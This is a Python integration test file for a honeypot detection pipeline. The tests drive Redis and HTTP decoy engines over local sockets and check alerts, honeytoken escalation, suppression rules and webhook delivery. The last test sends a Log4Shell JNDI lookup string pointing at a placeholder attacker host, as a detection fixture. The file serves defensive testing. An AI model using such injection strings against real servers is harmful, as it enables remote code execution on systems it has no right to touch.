"""End-to-end tests of the ingestion pipeline.

The unit suite covers each stage in isolation. These drive real engines over
real sockets and assert on what lands in the database, because the wiring
*between* stages is where this system's most damaging bugs have lived: an
engine that captured perfectly but whose events never reached the buffer, or a
suppression rule that silently ate everything, would pass every unit test.

Kept separate from `tests/unit/` because they bind ports and take seconds
rather than milliseconds.
"""

import asyncio
import contextlib
import os
import socket

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"

pytestmark = pytest.mark.asyncio


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture(autouse=True)
async def pipeline():
    """A live event buffer over a fresh in-memory database.

    The suppression and credential caches are process-global with a 30s TTL, so
    a rule loaded by one test would otherwise still be in force for the next
    one — which is exactly how a drop-everything rule from the suppression test
    silently emptied the tests that followed it.
    """
    from honeypot_mcp import suppression
    from honeypot_mcp.credential_match import invalidate_cache as invalidate_creds
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    def _reset_caches() -> None:
        suppression.invalidate_rule_cache()
        invalidate_creds()

    _reset_caches()
    event_buffer.reset_for_tests()
    await init_db()
    buffer = event_buffer.get_buffer()
    await buffer.start()
    yield buffer
    await buffer.stop()
    event_buffer.reset_for_tests()
    _reset_caches()
    await close_db()


async def _deploy(engine_type: str, port: int, config: dict | None = None) -> str:
    from honeypot_mcp.engines import get_engine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotStatus, HoneypotType

    name = f"it-{engine_type}-{port}"
    async with get_session() as session:
        session.add(
            Honeypot(
                name=name,
                type=HoneypotType(engine_type),
                port=port,
                status=HoneypotStatus.RUNNING,
                config=config or {},
            )
        )
    engine = get_engine(HoneypotType(engine_type))
    await engine.start(name, port, config or {})
    return name


async def _alerts_after_flush(timeout: float = 6.0) -> list:
    """Wait for the flusher to drain, then read what actually persisted."""
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    deadline = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(0.4)
        async with get_session() as session:
            rows = (await session.execute(select(Alert))).scalars().all()
        if rows:
            return list(rows)
    return []


async def test_attack_reaches_the_database_through_the_whole_pipeline():
    """A real TCP connection to a real engine must become a persisted Alert.

    This is the path every feature depends on: engine → submit_event →
    suppression → credential match → buffer → flusher → DB.
    """
    port = _free_port()
    await _deploy("redis", port)

    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(b"*2\r\n$4\r\nAUTH\r\n$8\r\nhunter22\r\n")
    await writer.drain()
    await reader.read(256)
    writer.close()

    alerts = await _alerts_after_flush()
    assert alerts, "no alert persisted — the pipeline is broken end to end"
    assert any("redis" in a.event_type for a in alerts)
    captured = [a for a in alerts if a.payload.get("password")]
    assert captured, "the submitted password never reached the database"
    assert captured[0].payload["password"] == "hunter22"


async def test_planted_credentials_escalate_to_critical_end_to_end():
    """The platform's headline claim: plant a credential, have an attacker use
    it against a honeypot, and the alert arrives already escalated and linked
    back to the token. Exercises engine → credential_match → flusher → token
    state change as one flow."""
    from sqlalchemy import select

    from honeypot_mcp.credential_match import invalidate_cache
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import (
        AlertSeverity,
        Honeytoken,
        HoneytokenStatus,
        HoneytokenType,
    )

    async with get_session() as session:
        session.add(
            Honeytoken(
                type=HoneytokenType.CREDENTIAL,
                label="planted svc account",
                token_value="svc-backup:Sup3rSecret!",
                status=HoneytokenStatus.ACTIVE,
                token_meta={
                    "service": "any",
                    "credentials": [{"username": "svc-backup", "password": "Sup3rSecret!"}],
                },
            )
        )
    invalidate_cache()

    port = _free_port()
    await _deploy("redis", port)
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(b"*3\r\n$4\r\nAUTH\r\n$10\r\nsvc-backup\r\n$12\r\nSup3rSecret!\r\n")
    await writer.drain()
    await reader.read(256)
    writer.close()

    alerts = await _alerts_after_flush()
    escalated = [a for a in alerts if a.severity == AlertSeverity.CRITICAL]
    assert escalated, f"planted credential did not escalate: {[a.event_type for a in alerts]}"
    assert "honeytoken_triggered" in escalated[0].event_type

    async with get_session() as session:
        token = (await session.execute(select(Honeytoken))).scalars().first()
    assert token.status == HoneytokenStatus.TRIGGERED, "token was never marked triggered"


async def test_suppression_rule_stops_events_before_the_database():
    """Suppression runs at submit time, so a dropped event should leave no
    trace at all — the check that it is wired ahead of the buffer."""
    from honeypot_mcp import suppression
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import SuppressionRule

    async with get_session() as session:
        session.add(
            SuppressionRule(
                label="drop-loopback",
                ip_pattern="127.0.0.0/8",
                action="drop",
                active=True,
            )
        )
    suppression.invalidate_rule_cache()

    port = _free_port()
    await _deploy("redis", port)
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(b"*2\r\n$4\r\nAUTH\r\n$3\r\nabc\r\n")
    await writer.drain()
    await reader.read(128)
    writer.close()

    assert await _alerts_after_flush(timeout=3.0) == [], "suppressed events reached the database"


async def test_webhook_receives_what_the_engine_captured():
    """Alerts must reach subscribers, not just the database. Runs a real HTTP
    receiver so the delivery worker's own serialisation is exercised."""
    from aiohttp import web

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import AlertSeverity, Subscription
    from honeypot_mcp.webhooks import get_delivery, invalidate_subscription_cache

    received: list[dict] = []

    async def handler(request: web.Request) -> web.Response:
        received.append(await request.json())
        return web.Response(text="ok")

    app = web.Application()
    app.router.add_post("/hook", handler)
    runner = web.AppRunner(app)
    await runner.setup()
    hook_port = _free_port()
    await web.TCPSite(runner, "127.0.0.1", hook_port).start()

    try:
        async with get_session() as session:
            session.add(
                Subscription(
                    url=f"http://127.0.0.1:{hook_port}/hook",
                    label="integration",
                    severity_threshold=AlertSeverity.LOW,
                    active=True,
                    format="json",
                )
            )
        invalidate_subscription_cache()

        delivery = get_delivery()
        await delivery.start()
        from honeypot_mcp.storage.event_buffer import get_buffer

        get_buffer().set_on_flush(delivery.enqueue_batch)

        port = _free_port()
        await _deploy("redis", port)
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(b"*2\r\n$4\r\nAUTH\r\n$5\r\nadmin\r\n")
        await writer.drain()
        await reader.read(128)
        writer.close()

        for _ in range(30):
            await asyncio.sleep(0.4)
            if received:
                break
        assert received, "no webhook delivery — alerts never leave the database"
        assert received[0].get("source_ip") == "127.0.0.1"
        await delivery.stop()
    finally:
        await runner.cleanup()


async def test_http_engine_flags_an_exploit_attempt_end_to_end():
    """A Log4Shell probe over a real socket must arrive classified, not raw."""
    import aiohttp

    from honeypot_mcp.storage.models import AlertSeverity

    port = _free_port()
    await _deploy("http", port)

    async with aiohttp.ClientSession() as session:
        # The response itself is irrelevant; what matters is what the engine
        # recorded on the way past.
        with contextlib.suppress(Exception):
            await session.get(
                f"http://127.0.0.1:{port}/",
                headers={"User-Agent": "${jndi:ldap://evil.test/x}"},
                timeout=aiohttp.ClientTimeout(total=5),
            )

    alerts = await _alerts_after_flush()
    exploits = [a for a in alerts if a.payload.get("exploit_categories")]
    assert exploits, f"exploit not classified: {[a.event_type for a in alerts]}"
    assert "log4shell" in exploits[0].payload["exploit_categories"]
    assert exploits[0].severity == AlertSeverity.CRITICAL
